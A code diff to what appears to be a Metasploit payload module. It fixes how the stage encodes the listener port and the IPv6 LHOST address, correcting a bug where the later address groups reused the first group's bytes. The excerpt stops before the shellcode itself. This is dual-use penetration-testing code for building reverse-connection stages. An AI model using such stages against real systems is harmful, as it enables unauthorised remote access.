@@ -30,29 +30,33 @@ module MetasploitModule
   end
 
 def generate_stage(opts={})
-      temp =  [datastore['LPORT'].to_i].pack('S>')
-      tcp_port = temp.unpack('H*')
-      order = (order = [3, 2, 1, 0])
+      port_order = ([1,0])
+      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
+      tcp_port.pop 
+      tcp_port.shift 
+      tcp_port = (port_order.map{|x| tcp_port[x]}).join('')
+      
+      ip_order =  ([3, 2, 1, 0])
       my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
       first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
       first.pop
       first.shift
-      first = (order.map{|x| first[x]}).join('')
+      first = (ip_order.map{|x| first[x]}).join('')
 
       second = (my_ipv6[1].unpack('H*')).to_s.scan(/../)
       second.pop
       second.shift
-      second = (order.map{|x| first[x]}).join('')
+      second = (ip_order.map{|x| second[x]}).join('')
 
       third = (my_ipv6[2].unpack('H*')).to_s.scan(/../)
       third.pop
       third.shift
-      third = (order.map{|x| first[x]}).join('')
+      third = (ip_order.map{|x| third[x]}).join('')
 
       fourth = (my_ipv6[3].unpack('H*')).to_s.scan(/../)
       fourth.pop
       fourth.shift
-      fourth = (order.map{|x| first[x]}).join('')
+      fourth = (ip_order.map{|x| fourth[x]}).join('')
 
 
     payload_data =<<-EOS/
